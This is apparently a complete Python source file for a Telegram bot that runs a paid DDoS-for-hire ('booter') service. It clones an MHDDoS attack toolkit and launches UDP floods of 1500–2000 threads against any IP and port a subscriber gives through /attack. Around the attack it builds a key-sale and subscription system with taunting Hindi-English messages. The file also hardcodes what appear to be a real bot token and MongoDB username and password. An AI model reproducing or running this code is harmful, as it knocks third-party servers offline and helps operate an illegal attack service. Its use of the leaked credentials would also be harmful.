import telebot
import subprocess
import threading
import time
import random
import os
from telebot import types
from datetime import datetime, timedelta
from pymongo import MongoClient

# --- CONFIG ---
TOKEN = '8676988617:AAF8sRBKuScBqbWP23ggZRrerAGabu0dfCw'
# Is link mein DNS bypass settings pehle se add hain
MONGO_URL = "mongodb+srv://riderbhai:riderbhai321@cluster0.yvrweuu.mongodb.net/?retryWrites=true&w=majority&connectTimeoutMS=30000&socketTimeoutMS=30000"
ADMIN_ID = 6075779781 
bot = telebot.TeleBot(TOKEN)

# --- MONGODB CONNECTION ---
try:
    client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
    db = client['RiderBot']
    users_col = db['users']
    keys_col = db['keys']
    client.admin.command('ping')
    print("✅ MongoDB System Connected Successfully!")
except Exception as e:
    print(f"❌ Connection Error: {e}")

# --- ENGINE SETUP ---
if not os.path.exists("MHDDoS"):
    os.system("git clone https://github.com/Grizzly-Anis/MHDDoS-Lite.git MHDDoS")

# --- PROGRESS BAR ---
def get_progress_bar(percent):
    bar_length = 10
    filled = int(percent / 10)
    return "🔥" * filled + "🌑" * (bar_length - filled)

# --- ATTACK LOGIC ---
def run_attack(ip, port, duration, chat_id, message_id, username):
    threads = random.randint(1500, 2000)
    command = f"python3 start.py UDP {ip} {port} {threads} {duration}"
    
    try:
        process = subprocess.Popen(command, shell=True, cwd="./MHDDoS")
        start_time = time.time()
        
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            remaining = int(duration - elapsed)
            percent = min(100, int((elapsed / duration) * 100))
            bar = get_progress_bar(percent)
            
            try:
                bot.edit_message_text(
                    chat_id=chat_id, message_id=message_id,
                    text=(f"🚀 **VVIP ATTACK IN PROGRESS** 🚀\n"
                          f"━━━━━━━━━━━━━━━━━━━━━━\n"
                          f"👤 **Attacker:** `@{username}`\n"
                          f"🎯 **Target:** `{ip}:{port}`\n"
                          f"⏳ **Remaining:** `{remaining}s` / `{duration}s`\n"
                          f"📊 **Power:** `{bar} {percent}%` \n"
                          f"🛡️ **System:** `BYPASSING CLOUD... ✅` \n"
                          f"━━━━━━━━━━━━━━━━━━━━━━"),
                    parse_mode="Markdown"
                )
            except: pass
            time.sleep(5)
        
        process.terminate()
        bot.send_message(chat_id, f"✅ **ATTACK FINISHED!**\nTarget `{ip}` was hammered successfully. 🔥")
    except: pass

# --- KEYBOARDS ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('🚀 Start VVIP Attack', '👤 My Profile', '🔑 Redeem Key')
    return markup

# --- COMMANDS ---

@bot.message_handler(commands=['start'])
def welcome(m):
    user_id = m.from_user.id
    user_data = users_col.find_one({"user_id": user_id})
    
    is_valid = (user_id == ADMIN_ID)
    if not is_valid and user_data:
        try:
            expiry = datetime.strptime(user_data['expiry'], '%Y-%m-%d %H:%M:%S')
            if expiry > datetime.now():
                is_valid = True
        except: pass

    if is_valid:
        bot.send_message(m.chat.id, f"💀 **Welcome Boss @{m.from_user.username}!**\nSystem is online and ready.", reply_markup=main_menu())
    else:
        bot.send_message(m.chat.id, "🚫 **ACCESS DENIED!** 🚫\n\nSubscription lo warna block maar dunga! 😂\nContact Admin @FLEXOP01 for Key. 🖕")

@bot.message_handler(commands=['genkey'])
def gen(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        days = int(m.text.split()[1])
        key = f"RIDER-{random.randint(1000, 9999)}"
        keys_col.insert_one({"key": key, "days": days})
        bot.send_message(m.chat.id, f"🔑 **VVIP KEY CREATED**\n\nClick to Copy:\n`/redeem {key}`\n\n**Validity:** {days} Days")
    except: bot.reply_to(m, "Format: `/genkey 1`")

@bot.message_handler(commands=['redeem'])
def redeem(m):
    user_id = m.from_user.id
    parts = m.text.split()
    if len(parts) < 2:
        bot.reply_to(m, "❌ Key dalo! Format: `/redeem RIDER-XXXX`")
        return
        
    key_text = parts[1]
    key_data = keys_col.find_one({"key": key_text})
    
    if key_data:
        days = key_data['days']
        expiry = datetime.now() + timedelta(days=days)
        users_col.update_one({"user_id": user_id}, {"$set": {"expiry": expiry.strftime('%Y-%m-%d %H:%M:%S')}}, upsert=True)
        keys_col.delete_one({"key": key_text})
        bot.send_message(m.chat.id, f"🎉 **ACCESS GRANTED!**\n\nAb tere paas **{days} din** ki power hai. 🔥\n\n**Usage:** `/attack IP PORT TIME`", reply_markup=main_menu())
    else:
        bot.reply_to(m, "❌ **INVALID KEY!**")

@bot.message_handler(func=lambda m: m.text == '🚀 Start VVIP Attack')
def guide(m):
    bot.reply_to(m, "🚀 **Command:** `/attack <IP> <PORT> <TIME>`\n\nExample: `/attack 1.1.1.1 80 120`")

@bot.message_handler(func=lambda m: m.text == '👤 My Profile')
def profile(m):
    user_id = m.from_user.id
    user_data = users_col.find_one({"user_id": user_id})
    if user_id == ADMIN_ID: status = "OWNER 👑"
    elif user_data: status = f"Active ✅ (Expires: {user_data['expiry']})"
    else: status = "No Access ❌"
    bot.send_message(m.chat.id, f"👤 **USER PROFILE**\n🆔 ID: `{user_id}`\n📊 Status: {status}")

@bot.message_handler(commands=['attack'])
def handle_attack(m):
    user_id = m.from_user.id
    user_data = users_col.find_one({"user_id": user_id})
    is_auth = (user_id == ADMIN_ID) or (user_data and datetime.strptime(user_data['expiry'], '%Y-%m-%d %H:%M:%S') > datetime.now())

    if not is_auth:
        bot.reply_to(m, "❌ **Access Denied!** Pehle subscription lo.")
        return

    try:
        p = m.text.split()
        if len(p) < 4:
            bot.reply_to(m, "❌ Format: `/attack IP PORT TIME`")
            return
        sent = bot.reply_to(m, "📡 **CRACKING SERVER PROTECTION... ⚡**")
        threading.Thread(target=run_attack, args=(p[1], int(p[2]), int(p[3]), m.chat.id, sent.message_id, m.from_user.username)).start()
    except: pass

print("🚀 Dangerous Bot is Online!")
bot.infinity_polling()
